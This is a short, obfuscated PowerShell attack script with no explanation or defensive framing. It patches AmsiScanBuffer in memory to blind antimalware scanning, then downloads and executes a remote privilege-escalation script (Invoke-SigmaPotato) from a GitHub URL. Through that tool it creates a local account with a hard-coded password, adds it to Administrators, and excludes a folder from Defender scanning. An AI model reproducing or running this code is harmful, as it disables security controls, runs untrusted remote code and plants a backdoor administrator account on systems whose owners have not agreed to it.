#Rasta-mouses Amsi-Scan-Buffer patch \n
$Q1FOopkGWA6sK = @"
using System;
using System.Runtime.InteropServices;
public class Q1FOopkGWA6sK {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr BkOEJJAivV4szY8No, string Y4NhSY);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr kQ3Ra8_ilMIiYE14A, UIntPtr ZUu, uint NU_pb8ccZyv, out uint Wb_ZC8tFJGBipQ76k);
}
"@

Add-Type $Q1FOopkGWA6sK

$IgXT4W = [Q1FOopkGWA6sK]::LoadLibrary("$(('â'+'m'+'s'+'í'+'.'+'d'+'l'+'l').NorMALIZE([chAR]([bYTe]0x46)+[cHAR](75+36)+[char](83+31)+[chAR]([bYtE]0x6d)+[ChAR]([byTE]0x44)) -replace [Char](92+56-56)+[chAR](112*39/39)+[cHar](123+71-71)+[chaR]([byTe]0x4d)+[chaR]([BytE]0x6e)+[CHAR]([byte]0x7d))")
$ythvDWzz3LbTxDF = [Q1FOopkGWA6sK]::GetProcAddress($IgXT4W, "$([ChaR](65)+[char](109)+[CHAR]([bytE]0x73)+[char](105*17/17)+[CHaR](15+68)+[ChAr](99*11/11)+[CHaR](97+38-38)+[CHaR]([byTE]0x6e)+[cHAr](66)+[cHAr](58+59)+[Char]([BYTe]0x66)+[Char]([byTE]0x66)+[chAR]([BYtE]0x65)+[chAR]([BYtE]0x72))")
$p = 0
[Q1FOopkGWA6sK]::VirtualProtect($ythvDWzz3LbTxDF, [uint32]5, 0x40, [ref]$p)
$uj6KxHG2YVo6scsAh = "0xB8"
$a39TIXrj66n601K = "0x57"
$_Ir9Qz5bc = "0x00"
$Ezz23zi = "0x07"
$XoQ = "0x80"
$mKCC = "0xC3"
$ooLT = [Byte[]] ($uj6KxHG2YVo6scsAh,$a39TIXrj66n601K,$_Ir9Qz5bc,$Ezz23zi,+$XoQ,+$mKCC)
[System.Runtime.InteropServices.Marshal]::Copy($ooLT, 0, $ythvDWzz3LbTxDF, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
